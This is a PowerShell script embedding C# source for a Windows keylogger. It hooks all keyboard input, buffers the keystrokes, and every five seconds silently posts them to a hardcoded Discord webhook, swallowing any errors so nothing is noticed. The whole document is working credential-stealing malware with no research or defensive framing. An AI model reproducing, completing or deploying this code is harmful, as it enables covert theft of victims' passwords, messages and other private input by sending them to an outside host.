Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Net.Http

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;

namespace KeyLogger {
    public static class Program {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;

        private static StringBuilder buffer = new StringBuilder();
        private static readonly object bufferLock = new object();

        private static string discordWebhookUrl = "https://discordapp.com/api/webhooks/1408110244558799019/nU-r_w_V3FtUCzX7cv08lV4MhVojEPR0cQ5XsP7dI-HuEDNRvr3gZOOwcRyZnjcmilgO";

        [STAThread]
        public static void Main() {
            System.Timers.Timer sendTimer = new System.Timers.Timer(5000);
            sendTimer.Elapsed += (s, e) => SendBufferAsync().Wait();
            sendTimer.AutoReset = true;
            sendTimer.Enabled = true;

            hookId = SetHook(hookProc);
            Application.Run();
            UnhookWindowsHookEx(hookId);
        }

        private static IntPtr SetHook(HookProc proc) {
            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, moduleHandle, 0);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyStr = ConvertKeyToString(vkCode);
                if (!string.IsNullOrEmpty(keyStr)) {
                    lock(bufferLock) {
                        buffer.Append(keyStr);
                    }
                }
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private static async Task SendBufferAsync() {
            string dataToSend;
            lock(bufferLock) {
                if (buffer.Length == 0) return;
                dataToSend = buffer.ToString();
                buffer.Clear();
            }

            try {
                using (HttpClient client = new HttpClient()) {
                    string payload = "{\"content\": \"" + EscapeForJson(dataToSend) + "\"}";
                    StringContent content = new StringContent(payload, Encoding.UTF8, "application/json");
                    await client.PostAsync(discordWebhookUrl, content);
                }
            } catch {
                // Silent failure to avoid disruption
            }
        }

        private static string EscapeForJson(string s) {
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
        }

        private static string ConvertKeyToString(int vkCode) {
            bool shiftPressed = (GetKeyState(0x10) & 0x8000) != 0; // VK_SHIFT
            bool capsLockOn = (GetKeyState(0x14) & 0x0001) != 0;   // VK_CAPITAL

            if (vkCode >= 0x41 && vkCode <= 0x5A) {
                char c = (char)vkCode;
                bool upper = capsLockOn ^ shiftPressed;
                return upper ? c.ToString() : c.ToString().ToLower();
            }
            if (vkCode >= 0x30 && vkCode <= 0x39) {
                if (shiftPressed) return ShiftNumberToSymbol((char)vkCode);
                return ((char)vkCode).ToString();
            }
            if (vkCode >= 0x60 && vkCode <= 0x69)
                return (vkCode - 0x60).ToString();

            switch (vkCode) {
                case 0x20: return " ";
                case 0x0D: return "\n";
                case 0x09: return "\t";
                case 0x14: return null;
                case 0xBD: return shiftPressed ? "_" : "-";
                case 0xBB: return shiftPressed ? "+" : "=";
                case 0xDB: return shiftPressed ? "{" : "[";
                case 0xDD: return shiftPressed ? "}" : "]";
                case 0xDC: return shiftPressed ? "|" : "\\";
                case 0xBA: return shiftPressed ? ":" : ";";
                case 0xDE: return shiftPressed ? "\"" : "'";
                case 0xBC: return shiftPressed ? "<" : ",";
                case 0xBE: return shiftPressed ? ">" : ".";
                case 0xBF: return shiftPressed ? "?" : "/";
                case 0xC0: return shiftPressed ? "~" : "`";
                default: return null;
            }
        }

        private static string ShiftNumberToSymbol(char number) {
            switch (number) {
                case '1': return "!";
                case '2': return "@";
                case '3': return "#";
                case '4': return "$";
                case '5': return "%";
                case '6': return "^";
                case '7': return "&";
                case '8': return "*";
                case '9': return "(";
                case '0': return ")";
                default: return number.ToString();
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);
    }
}
"@

[KeyLogger.Program]::Main()
